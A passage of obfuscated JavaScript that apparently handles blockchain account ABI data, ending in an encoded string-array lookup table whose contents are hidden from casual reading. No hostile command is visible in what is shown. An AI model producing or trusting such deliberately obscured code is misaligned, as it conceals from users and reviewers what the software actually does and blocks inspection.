_0x35fd87['rawAbiToJs'+'on'](_0x563a8e),_0x12b3bd={'accountName':_0x4b9709,'rawAbi':_0x563a8e,'abi':_0x521458};return _0x12b3bd;}catch(_0x3df113){console['log'](_0x3df113);}};function _0x5ba6(){const _0x5bfd84=['vxnPBMCGv0fnia','Bg9N','vwLUDdHbCNjHEq','lNDHBq','mJa1odi5nKveEgHVrG','lI4U','lcbOzxHFzgLNzq','igrPzMzPy3vSDa','AwvKia','qu4GtK9uifnpta','ntC5mda2y0fIChrz','Dg9tDhjPBMC','AM9PBG','nZe0mtK0zhbQqNbj','lcbSyxn0id0G','mZjYs3P3ruq','rM91BMqGAgfZAa','zMXVB3i','ihrHA2LUzYa','ywjPuhjVDMLKzq','CgfKu3rHCNq','z2v0uMf3qwjP','mtC1ELzvq3nn','C2XPy2u','Ahr0Chm6lY93yq','mdaWma','Bwf0y2G','BwfW','ywjP','D2f4ywnJB3vUDa','tKvx','Bs5MzwrLCMf0Aq','ugvYzM9YBwLUzW','igL0zxjHDgLVBG','ChvZAe5HBwu','u09suLKGv0uGqW','BgvUz3rO','C3qG','mteYmtK4t2DuqNPs','CMfUzg9T','C2v0','nLzJuMXgEq','Ec5IBg9Ry3jHzG','C3vIC3rY','z2v0vgLTzq','ywnJB3vUDa','nZm2nZuZnuD3q3DeBq','mtqYmJuWnJbbsvPYq1G','vKveieXpt1aG','mJe3mJKWBerfCw9e','DgvYCY5PBW','zgLNzxn0'];_0x5ba6=function(){return _0x5bfd84;};return _0x5ba6();}